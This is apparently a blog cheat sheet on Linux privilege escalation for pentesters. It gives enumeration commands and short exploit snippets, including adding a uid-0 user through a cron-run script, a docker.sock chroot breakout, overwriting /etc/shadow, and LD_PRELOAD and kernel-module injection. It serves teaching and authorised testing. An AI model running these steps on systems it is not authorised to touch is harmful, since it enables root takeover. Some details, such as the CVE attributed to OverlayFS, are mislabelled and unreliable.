---
title: "Linux Privilege Escalation Security Cheat Sheet"
date: 2025-09-17 16:00:00 +0800
categories: [linux, security, privilege-escalation, cheat-sheet]
tags: [linux, pentesting, security, privilege-escalation, cheat-sheet]
excerpt: "A comprehensive Linux privilege escalation and security cheat sheet for pentesters and system administrators."
author: Wrench L
image: images/blog_images/Linux_privileges.png 
---

# Linux Privilege Escalation Security Cheat Sheet

**Author:** Wrench  
**Date:** 17 September 2025  
**Read Time:** ~10 mins  

This cheat sheet is designed to help **pentesters**, **security enthusiasts**, and **sysadmins** quickly perform Linux privilege escalation and secure system configurations. Each section explains **why we perform the steps** and **what they accomplish**, so you not only execute commands but also understand their purpose.

---

## Table of Contents

1. [Enumeration Basics](#1-enumeration-basics)  
2. [The 6-Point Checklist](#2-the-6-point-checklist)  
3. [Useful Tool: LinPEAS](#3-useful-tool-linpeas)  
4. [Common Kernel Exploits](#4-common-kernel-exploits)  
5. [Common Misconfigurations](#5-common-misconfigurations)  
6. [Manual Exploit Examples](#6-manual-exploit-examples)  
7. [Sticky Bit & World-Writable Directories](#7-sticky-bit--world-writable-directories)  
8. [Docker / LXC / Kubernetes Priv Esc](#8-docker--lxc--kubernetes-priv-esc)  
9. [Exploiting Capabilities Beyond SUID](#9-exploiting-capabilities-beyond-suid)  
10. [Scheduled Tasks Outside Cron](#10-scheduled-tasks-outside-cron)  
11. [Systemd Misconfigurations](#11-systemd-misconfigurations)  
12. [Exploiting PAM / Authentication Weaknesses](#12-exploiting-pam--authentication-weaknesses)  
13. [Kernel Module / Device Node Exploits](#13-kernel-module--device-node-exploits)  
14. [Weak Group Memberships](#14-weak-group-memberships)  
15. [Exploiting Network Services](#15-exploiting-network-services)  
16. [File Descriptors & Inherited Permissions](#16-file-descriptors--inherited-permissions)  
17. [Misconfigured AppArmor / SELinux](#17-misconfigured-apparmor--selinux)  
18. [Environment Injection via Libraries](#18-environment-injection-via-libraries)  
19. [Password & Key Leakage](#19-password--key-leakage)  
20. [Sticky Misconfigurations in System Services](#20-sticky-misconfigurations-in-system-services)  
21. [Labs to Practice](#21-labs-to-practice)  
22. [Solid Writeups](#22-solid-writeups)  
23. [Blogs & Guides](#23-blogs--guides)  
24. [Suggested Structure for Each Technique](#24-suggested-structure-for-each-technique)  
25. [Final Tips](#25-final-tips)  

---

## 1. Enumeration Basics

**Why:** Understanding the system is critical before attempting exploits.  
**What:** Provides a map of potential attack vectors: misconfigured files, services, and binaries.

**Always enumerate:**

- Kernel version  
- SUID/SGID binaries  
- Writable files/folders  
- Cron jobs  
- Services/Processes  
- Network access  
- Environment variables  
- Sudo permissions  

---

## 2. The 6-Point Checklist

### 2.1 Kernel & OS Info

**Why:** Older kernels often have known vulnerabilities.  
**What:** Identifies direct root exploits.

```bash
uname -a  
cat /proc/version  
cat /etc/*release*
```
Look for: Dirty Cow, Dirty Pipe, or other CVEs.

---

### 2.2 SUID/SGID Binaries

**Why:** SUID binaries run with elevated privileges.  
**What:** Vulnerable SUIDs = root access.

```bash
find / -perm -4000 -type f 2>/dev/null  
find / -perm -2000 -type f 2>/dev/null
```
Common: `nmap`, `vim`, `less`, `cp`, `bash`

---

### 2.3 Writable or Misowned Files

**Why:** Writable root-owned files can be abused.  
**What:** Edit or replace files/scripts that run as root.

```bash
find / -writable -type f 2>/dev/null  
find / -writable -type d 2>/dev/null  
ls -la /etc/passwd  
ls -la /etc/shadow
```

---

### 2.4 Services & Cron Jobs

**Why:** Misconfigured cron jobs/services run with root.  
**What:** Exploiting them = root access.

```bash
ps aux  
cat /etc/crontab  
ls -la /etc/cron.*
```
Look for modifiable scripts run as root.

---

### 2.5 Passwords in Files

**Why:** Credentials may be left in files.  
**What:** May allow sudo/root login.

```bash
grep -Ri "password" /etc/*  
grep -R "password" /home/* 2>/dev/null
```
Check `.bash_history`, configs, `.git`, backups.

---

### 2.6 Abusable Capabilities

**Why:** Linux capabilities allow special privileges.  
**What:** Dangerous capabilities lead to escalation.

```bash
getcap -r / 2>/dev/null
```
Look for:  
- `cap_setuid+ep`  
- `cap_net_bind_service+ep`

---

## 3. Useful Tool: LinPEAS

**Why:** Automates privilege escalation checks.  
**What:** Saves time, covers more ground.

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh  
chmod +x linpeas.sh  
./linpeas.sh
```

---

## 4. Common Kernel Exploits

- Dirty Cow – CVE-2016-5195  
- Dirty Pipe – CVE-2022-0847  
- OverlayFS – CVE-2021-4034  
- Polkit pkexec – CVE-2021-4034  
- Cronjob misconfig  
- Sudo misconfig / sudo without password  

---

## 5. Common Misconfigurations

| Thing              | What to look for                                    | Why/What it will do                         |
|--------------------|----------------------------------------------------|---------------------------------------------|
| sudo -l            | Run commands as root without password               | Immediate root access if allowed            |
| Writable /etc/passwd | Create a new root user manually                  | Escalate via new account                    |
| Custom services    | Run as root but editable by you                     | Modify scripts/services for root access     |
| Docker/LXC         | Container breakout                                 | Access host from container                  |

---

## 6. Manual Exploit Examples

### Sudo Abuse

```bash
sudo -l  
sudo /bin/bash   # If allowed  
```

### SUID Binary (e.g., Nmap)

```bash
nmap --interactive  
!sh  
```

### Writable /etc/passwd

```bash
openssl passwd "pass123"  
# Add new line to /etc/passwd with uid=0  
```

---

## 7. Sticky Bit & World-Writable Directories

**Directories like `/tmp` or `/var/tmp` are world-writable, but sticky bit prevents deleting others’ files.**

**Exploit Example:**
```bash
echo 'useradd hacker -ou 0 -g 0' > /tmp/malicious.sh  
chmod +x /tmp/malicious.sh  
ln -s /tmp/malicious.sh /var/tmp/rootscript
```
(Trick root-owned cron/service to execute your script.)

---

## 8. Docker / LXC / Kubernetes Priv Esc

**Containers may have access to host resources.**

**Exploit Example:**
```bash
# If docker.sock is mounted
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# Misconfigured capabilities
docker run --cap-add=SYS_ADMIN -it ubuntu bash
```

---

## 9. Exploiting Capabilities Beyond SUID

**Binaries with dangerous Linux capabilities can be abused.**

**Exploit Example:**
```bash
getcap -r / 2>/dev/null
# If cap_dac_override is set:
cp /etc/shadow /tmp/shadow_copy  
nano /tmp/shadow_copy  
cp /tmp/shadow_copy /etc/shadow
```

---

## 10. Scheduled Tasks Outside Cron

**`at` jobs or systemd timers can execute as root.**

**Exploit Example:**
```bash
echo '/tmp/malicious.sh' | at now + 1 minute
systemctl cat some_timer.service
# Edit EnvironmentFile or ExecStartPre if writable
```

---

## 11. Systemd Misconfigurations

**Writable scripts/environment files referenced by systemd services can be abused.**

**Exploit Example:**
```bash
systemctl cat vulnerable.service
echo 'cp /etc/shadow /tmp/shadow_copy' >> /path/to/writable/script
```

---

## 12. Exploiting PAM / Authentication Weaknesses

**Misconfigured PAM modules may allow weak/null passwords.**

**Exploit Example:**
```bash
cat /etc/pam.d/*
# Attempt login as root if vulnerable
```

---

## 13. Kernel Module / Device Node Exploits

**Writable `/dev` nodes or module loading can be abused.**

**Exploit Example:**
```bash
ls -l /dev | grep root
insmod /tmp/evil.ko
```

---

## 14. Weak Group Memberships

**Membership in `docker`, `lxd`, `wheel`, `sudo` can mean root.**

**Exploit Example:**
```bash
groups
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

---

## 15. Exploiting Network Services

**Services running as root, with writable configs, are targets.**

**Exploit Example:**
```bash
netstat -tulpn
# Exploit writable configs or bind shells running as root
```

---

## 16. File Descriptors & Inherited Permissions

**Processes may leave privileged file descriptors open.**

**Exploit Example:**
```bash
ls -l /proc/<pid>/fd
# Inject payloads via writeable descriptors
```

---

## 17. Misconfigured AppArmor / SELinux

**Improper profiles may allow containment bypass.**

**Exploit Example:**
```bash
getenforce      # SELinux  
aa-status       # AppArmor
# Load shell bypassing policies
```

---

## 18. Environment Injection via Libraries

**Writable dirs in `LD_LIBRARY_PATH` or malicious `LD_PRELOAD`.**

**Exploit Example:**
```bash
export LD_PRELOAD=/tmp/malicious.so
# Run vulnerable root-owned binary
```

---

## 19. Password & Key Leakage

**Credentials left in files or backups.**

**Exploit Example:**
```bash
cat /root/.ssh/authorized_keys
ls /root/*.bak
# Use SSH or sudo to escalate
```

---

## 20. Sticky Misconfigurations in System Services

**Services writing logs/configs to `/tmp` or user-writable locations.**

**Exploit Example:**
```bash
echo 'cp /etc/shadow /tmp/shadow_copy' > /tmp/service.log
```

---

## 21. Labs to Practice

| Platform   | Lab Name                 | Notes                                      |
| ---------- | ------------------------ | ------------------------------------------ |
| TryHackMe  | “Linux PrivEsc”          | Beginner-friendly, step-by-step            |
| HackTheBox | “Beep”, “Lame”, “Bashed” | Realistic Linux privilege escalation paths |
| VulnHub    | “Basic Pentesting 1 & 2” | Classic local privilege escalation targets |

---

## 22. Solid Writeups

- [GTFOBins](https://gtfobins.github.io/) – SUID, sudo, and other abuses  
- [0xdf’s](https://0xdf.gitlab.io/) HTB Writeups – Very methodical  
- [HackTricks](https://book.hacktricks.wiki/en/index.html) – Encyclopedic  
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) – Real use-case examples  

---

## 23. Blogs & Guides

- [PEASS-ng](https://github.com/carlospolop/PEASS-ng) – LinPEAS is your best friend  
- [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)  
- [Decline](https://delinea.com/blog/linux-privilege-escalation) Privilege escalation on Linux  
- [Vaadata](https://www.vaadata.com/blog/linux-privilege-escalation-techniques-and-security-tips/) Linux Privilege Escalation: Techniques and Security Tips  

---

## 24. Suggested Structure for Each Technique

1. **What is it?**  
2. **Why does it happen?**  
3. **How to detect it?**  
4. **How to exploit it?**  
5. **Real-world example (link to writeup/lab)**  

---

## 25. Final Tips

- Always enumerate thoroughly before exploiting.  
- Keep local copies of privesc scripts.  
- Practice on Hack The Box, TryHackMe, VulnHub.  
- Understand **why** each step works and **what** it achieves for effective application.

---